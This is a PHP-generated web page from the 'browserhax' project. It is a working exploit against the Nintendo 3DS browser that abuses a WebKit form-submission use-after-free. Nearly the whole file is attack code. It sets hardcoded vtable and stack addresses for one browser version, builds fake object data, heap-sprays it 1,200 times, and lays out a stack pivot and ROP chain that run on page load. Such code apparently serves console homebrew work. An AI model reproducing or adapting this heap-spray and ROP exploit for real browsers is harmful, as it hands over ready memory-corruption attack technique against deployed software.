<?php

/*
https://chromium.googlesource.com/experimental/chromium/blink/+/refs/heads/master/LayoutTests/fast/forms/form-submission-crash-successful-submit-button.html
https://bugs.chromium.org/p/chromium/issues/detail?id=303657
https://src.chromium.org/viewvc/blink?view=revision&revision=159590
*/

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	if(($browserver & 0xf) == 0x8)
	{
		$VTABLEPTR = 0x08cc7018;
		$STACKPTR_ADR = 0x08ce8018;
	}
	else
	{
		echo "This browser version is not supported.\n";
		exit;
	}
}
else
{
	echo "This browser is not supported.\n";
	exit;
}

$ROPHEAP = $VTABLEPTR;

$OBJECTDATA_OVERWRITE = "\"";

$loopcnt = 0;
for($i=0; $i<0x7c; $i+=4)
{

	if($i==0)
	{
		$OBJECTDATA_OVERWRITE.= genu32_unicode($VTABLEPTR);
	}
	else
	{
		if($loopcnt==0)$OBJECTDATA_OVERWRITE .= genu32_unicode($STACKPTR_ADR);//stack ptr
		if($loopcnt==1)$OBJECTDATA_OVERWRITE .= genu32_unicode($VTABLEPTR);//lr / vtableptr when this overwrites object+0
		if($loopcnt==2)$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);

		$loopcnt++;
		if($loopcnt > 2)$loopcnt = 0;
	}
}

$OBJECTDATA_OVERWRITE .= "\"";

generate_ropchain();

?>
<!DOCTYPE html>
<body>
<script>
var form1;
var submit1;

obj = new Array();
objdatapayload = new Array();

function spray()
{
	for(i=0; i<1200; i++)
	{
		obj[i] = unescape(<?= $OBJECTDATA_OVERWRITE ?>);
	}
}

function ropsetup()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
{
	var stackpivot = unescape(<?= $STACKPIVOT ?>);
	var ropchainstart = unescape(<?= $NOPSLEDROP ?>);
	var ropchain = unescape(<?= $ROPCHAIN ?>);

	do
	{
		stackpivot += stackpivot;
		ropchainstart += ropchainstart;
	} while (stackpivot.length<0x10000);

	ropchainstart += ropchain;

        target = new Array();
	target2 = new Array();
        for(i = 0; i < 10; i++){
            if (i<5) {
		target[i] = stackpivot;
		target2[i] = target[i].substring(0);
		} else if (i>5) {
			target[i] = ropchainstart;
			target2[i] = target[i].substring(0);
		}
        }
}

function start() {
    form1 = document.createElement('form');
    submit1 = document.createElement('input');
    submit2 = document.createElement('input');
    submit1.type = 'submit';
    submit2.type = 'image';
    form1.addEventListener('submit', handleSubmit, false);
    form1.action = 'javascript:removeImage()';
    form1.appendChild(submit1);
    form1.appendChild(submit2);
    submit1.click();
}
function handleSubmit() {
    form1.removeChild(submit1);
}
function removeImage() {
    form1.removeChild(submit2);
    submit2 = null;
    spray();
    ropsetup();
}
window.onload = start;
</script>
</body>
